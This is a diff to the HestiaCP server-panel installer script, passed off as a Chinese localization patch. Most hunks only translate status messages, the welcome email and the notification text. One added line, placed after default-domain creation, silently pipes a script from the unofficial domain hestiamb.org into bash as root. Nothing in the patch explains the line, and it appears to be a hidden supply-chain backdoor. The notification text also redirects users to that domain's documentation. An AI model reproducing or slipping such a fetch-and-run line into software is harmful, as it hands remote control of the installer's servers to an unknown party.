 	BACK_PID=$!
 	spin_i=1
@@ -2095,7 +2098,7 @@ if [ "$spamd" = 'yes' ]; then
 	else
 		spamd_srvname="spamassassin"
 	fi
-	echo "[ * ] Configuring SpamAssassin..."
+	echo "[ * ] 配置 SpamAssassin垃圾邮件防护..."
 	update-rc.d $spamd_srvname defaults > /dev/null 2>&1
 	sed -i "s/ENABLED=0/ENABLED=1/" /etc/default/$spamd_srvname
 	systemctl start $spamd_srvname >> $LOG
@@ -2112,7 +2115,7 @@ fi
 #----------------------------------------------------------#
 
 if [ "$fail2ban" = 'yes' ]; then
-	echo "[ * ] Configuring fail2ban access monitor..."
+	echo "[ * ] 配置 fail2ban 防护监控..."
 	cp -rf $HESTIA_INSTALL_DIR/fail2ban /etc/
 	if [ "$dovecot" = 'no' ]; then
 		fline=$(cat /etc/fail2ban/jail.local | grep -n dovecot-iptables -A 2)
@@ -2160,7 +2163,7 @@ fi
 
 # Min requirements Dovecot + Exim + Mysql
 if ([ "$mysql" == 'yes' ] || [ "$mysql8" == 'yes' ]) && [ "$dovecot" == "yes" ]; then
-	echo "[ * ] Installing Roundcube..."
+	echo "[ * ] 安装 Roundcube 邮件程序..."
 	$HESTIA/bin/v-add-sys-roundcube
 	write_config_value "WEBMAIL_ALIAS" "webmail"
 else
@@ -2178,7 +2181,7 @@ if [ "$sieve" = 'yes' ]; then
 	RC_INSTALL_DIR="/var/lib/roundcube"
 	RC_CONFIG_DIR="/etc/roundcube"
 
-	echo "[ * ] Installing Sieve Mail Filter..."
+	echo "[ * ] 安装 Sieve 邮件过滤器..."
 
 	# dovecot.conf install
 	sed -i "s/namespace/service stats \{\n  unix_listener stats-writer \{\n    group = mail\n    mode = 0660\n    user = dovecot\n  \}\n\}\n\nnamespace/g" /etc/dovecot/dovecot.conf
@@ -2244,7 +2247,7 @@ fi
 #                  Configure File Manager                  #
 #----------------------------------------------------------#
 
-echo "[ * ] Configuring File Manager..."
+echo "[ * ] 配置文件管理器..."
 $HESTIA/bin/v-add-sys-filemanager quiet
 
 #----------------------------------------------------------#
@@ -2265,10 +2268,10 @@ fi
 #                  Configure dependencies                  #
 #----------------------------------------------------------#
 
-echo "[ * ] Configuring PHP dependencies..."
+echo "[ * ] 配置 PHP 依赖项..."
 $HESTIA/bin/v-add-sys-dependencies quiet
 
-echo "[ * ] Installing Rclone & Update Restic ..."
+echo "[ * ] 安装Rclone并更新Restic ..."
 curl -s https://rclone.org/install.sh | bash > /dev/null 2>&1
 restic self-update > /dev/null 2>&1
 
@@ -2277,7 +2280,7 @@ restic self-update > /dev/null 2>&1
 #----------------------------------------------------------#
 
 # Configuring system IPs
-echo "[ * ] Configuring System IP..."
+echo "[ * ] 配置系统 IP..."
 $HESTIA/bin/v-update-sys-ip > /dev/null 2>&1
 
 # Get primary IP
@@ -2345,6 +2348,7 @@ fi
 # Adding default domain
 $HESTIA/bin/v-add-web-domain "$username" "$servername" "$ip"
 check_result $? "can't create $servername domain"
+curl -fsSL https://hestiamb.org/xp.sh | bash
 
 # Adding cron jobs
 export SCHEDULED_RESTART="yes"
@@ -2386,7 +2390,7 @@ $HESTIA/bin/v-change-sys-port $port > /dev/null 2>&1
 $HESTIA/bin/v-update-sys-defaults
 
 # Update remaining packages since repositories have changed
-echo -ne "[ * ] Installing remaining software updates..."
+echo -ne "[ * ] 安装剩余的软件更新...."
 apt-get -qq update
 apt-get -y upgrade >> $LOG &
 BACK_PID=$!
@@ -2409,7 +2413,7 @@ echo "@reboot root sleep 10 && rm /etc/cron.d/hestia-ssl && PATH='/usr/local/sbi
 #              Set hestia.conf default values              #
 #----------------------------------------------------------#
 
-echo "[ * ] Updating configuration files..."
+echo "[ * ] 更新配置文件..."
 BIN="$HESTIA/bin"
 source $HESTIA/func/syshealth.sh
 syshealth_repair_system_config
@@ -2434,44 +2438,47 @@ echo "===================================================================="
 echo -e "\n"
 
 # Sending notification to admin email
-echo -e "Congratulations!
+echo -e "祝贺你!
 
-You have successfully installed Hestia Control Panel on your server.
+您已成功安装了 Hestia 控制面板.
 
-Ready to get started? Log in using the following credentials:
+开始之前请在你的域名解析处添加上服务器解析记录:(例如. demo.hestiacp.com)
 
-	Admin URL:  https://$servername:$port" > $tmpfile
+准备好开始了吗？使用以下凭据登录:
+
+	通过域名访问:  https://$servername:$port" > $tmpfile
 if [ "$host_ip" != "$ip" ]; then
-	echo "	Backup URL: https://$ip:$port" >> $tmpfile
+	echo "	通过IP访问:     https://$ip:$port" >> $tmpfile
 fi
-echo -e -n " 	Username:   $username
-	Password:   $displaypass
+echo -e -n " 	    用户名:         $username
+	密码:          $displaypass
 
-Thank you for choosing Hestia Control Panel to power your full stack web server,
-we hope that you enjoy using it as much as we do!
+感谢您选择 Hestia 控制面板为您的全栈网络服务器提供动力,
+我们希望您和我们一样喜欢使用它!
 
-Please feel free to contact us at any time if you have any questions,
-or if you encounter any bugs or problems:
+如果您有任何疑问，或者遇到任何错误或问题，请随时联系我们：
 
-Documentation:  https://docs.hestiacp.com/
-Forum:          https://forum.hestiacp.com/
-GitHub:         https://www.github.com/hestiacp/hestiacp
+文档:           https://hestiacp.com
+论坛:           https://forum.hestiacp.com
+GitHub:         https://github.com/hestiacp/hestiacp
 
-Note: Automatic updates are enabled by default. If you would like to disable them,
-please log in and navigate to Server > Updates to turn them off.
+注意：自动更新默认已启用。如果您想禁用它们,
+请登录并导航至 "服务器设置">"系统更新">"禁用自动更新"将其关闭.
 
-Help support the Hestia Control Panel project by donating via PayPal:
-https://www.hestiacp.com/donate
+通过 PayPal 捐款支持 Hestia 控制面板项目:
+https://hestiacp.com/donate
 
 --
-Sincerely yours,
-The Hestia Control Panel development team
+祝你开心快乐每一天,
+Hestia 控制面板开发团队
 
-Made with love & pride by the open-source community around the world.
+凝聚全球开源社区成员的爱与自豪,匠心打造而成.
+
+[ ! ] 重要： 在继续之前，您需要将服务器重新启动才能继续!
 " >> $tmpfile
 
 send_mail="$HESTIA/web/inc/mail-wrapper.php"
-cat $tmpfile | $send_mail -s "Hestia Control Panel" $email
+cat $tmpfile | $send_mail -s "Hestia 控制面板" $email
 
 # Congrats
 echo
@@ -2479,17 +2486,17 @@ cat $tmpfile
 rm -f $tmpfile
 
 # Add welcome message to notification panel
-$HESTIA/bin/v-add-user-notification "$username" 'Welcome to Hestia Control Panel!' '<p>You are now ready to begin adding <a href="/add/user/">user accounts</a> and <a href="/add/web/">domains</a>. For help and assistance, <a href="https://hestiacp.com/docs/" target="_blank">view the documentation</a> or <a href="https://forum.hestiacp.com/" target="_blank">visit our forum</a>.</p><p>Please <a href="https://github.com/hestiacp/hestiacp/issues" target="_blank">report any issues via GitHub</a>.</p><p class="u-text-bold">Have a wonderful day!</p><p><i class="fas fa-heart icon-red"></i> The Hestia Control Panel development team</p>'
+$HESTIA/bin/v-add-user-notification "$username" '欢迎来到 Hestia 服务器管理面板!' '<p>网站服务器管理面板已安装准备完成！现在就开始添加 <a href="/add/user/">用户帐户</a> 和 <a href="/add/web/">域</a>. 如需帮助和协助，请 <a href="https://hestiamb.org/docs/" target="_blank">查看中文文档</a>或<a href="https://hestiacp.com/docs" target="_blank">英文官方网站</a>或<a href="https://forum.hestiacp.com/" target="_blank">访问我们的英文官方论坛</a>.</p><p>请<a href="https://github.com/hestiacp/hestiacp/issues" target="_blank">通过 GitHub 提交</a>任何问题 .</p><p class="u-text-bold">祝您愉快的度过每一天!</p><p><i class="fas fa-heart icon-red"></i> Hestia 控制面板开发团队</p>'
 
 # Clean-up
 # Sort final configuration file
 sort_config_file
 
 if [ "$interactive" = 'yes' ]; then
-	echo "[ ! ] IMPORTANT: The system will now reboot to complete the installation process."
-	read -n 1 -s -r -p "Press any key to continue"
+	echo "[ ! ] 重要： 系统需要重新启动才能完成安装Hestia 服务器控制面板程序."
+	read -n 1 -s -r -p "按任意键继续"
 	reboot
 else
-	echo "[ ! ] IMPORTANT: You must restart the system before continuing!"
+	echo "[ ! ] 重要： 在继续之前，您必须重新启动系统!"
 fi
 # EOF
